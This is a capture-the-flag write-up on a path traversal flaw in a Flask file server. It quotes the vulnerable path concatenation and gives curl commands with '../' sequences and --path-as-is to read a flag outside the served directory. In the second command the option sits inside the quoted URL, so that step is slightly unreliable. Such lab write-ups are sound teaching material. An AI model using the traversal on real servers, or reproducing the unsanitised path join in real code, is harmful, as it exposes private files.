# Path Traversal 1

In this challenge, you are given a web server that serves files from a directory `/challenge/files`.

Reading the source of the web server shows us that it is a `flask` backend that exposes a `GET` endpoint at `/docs`.

```python
@app.route("/docs", methods=["GET"])
@app.route("/docs/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
```

Here is the vulnerability:
```python
requested_path = app.root_path + "/files/" + path
```

The code opens and reads from the `requested_path` without any cleaning of the path, so you can traverse outside of the `files` directory
by adding `..`s to the path, like so:

```bash
curl -v 'challenge.localhost:80/docs/../../flag'
```

However, if you leave the curl command as-is, it would resolve the `..`s before it gets sent out, trying to hit the endpoint
`challenge.localhost:80/flag`, which doesn't exist.

Going though the man page for curl, I found the flag `--path-as-is` resolves this issue:

```bash
curl -v 'challenge.localhost:80/docs/../../flag --path-as-is'
```

> GET /docs/../../flag HTTP/1.1